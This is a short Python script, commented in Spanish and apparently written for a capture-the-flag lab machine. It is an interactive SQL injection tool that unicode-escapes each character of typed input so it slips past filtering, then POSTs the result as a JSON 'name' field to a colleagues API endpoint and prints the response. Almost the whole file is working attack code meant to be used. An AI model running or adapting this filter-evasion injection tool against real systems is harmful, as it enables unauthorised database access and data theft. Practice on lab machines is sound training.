#!/usr/bin/python3
# SQL Injection Tamper - Char Unicode Escape
# Para este error es necesario revisar que el caracter '\' no sea bloqueado o reciba un status 500

from pwn import *
import requests, pdb, signal, time, json, sys

def def_handler(sig, frame):

    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://10.10.10.179/api/getColleagues"
# burp = {'http': 'http://127.0.0.1:8080'}

def getUnicode(sqli):

    sqli_modified = ""

    for character in sqli:
        sqli_modified += "\\u00" + hex(ord(character))[2::]

    return sqli_modified

def makeRequest(sqli_modified):

    headers = {
        'Content-Type': 'application/json;charset=utf-8'
    }

    post_data = '{"name":"%s"}' % sqli_modified

    r = requests.post(main_url, headers=headers, data=post_data)

    data_json = json.loads(r.text)
    print(json.dumps(data_json, indent=4))

if __name__ == '__main__':

    while True:

        sqli = input("> ")
        sqli = sqli.strip()

        sqli_modified = getUnicode(sqli)
        makeRequest(sqli_modified)
